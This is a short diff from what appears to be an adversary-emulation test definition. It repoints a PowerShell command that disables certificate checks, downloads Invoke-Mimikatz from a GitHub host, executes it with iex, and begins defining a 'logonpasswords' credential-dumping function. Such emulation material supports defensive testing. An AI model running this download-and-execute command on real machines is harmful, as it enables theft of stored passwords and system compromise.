@@ -13,7 +13,7 @@
         command: |
           [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
           $web = (New-Object System.Net.WebClient);
-          $result = $web.DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1");
+          $result = $web.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1");
           iex $result;
           function logonpasswords
           {
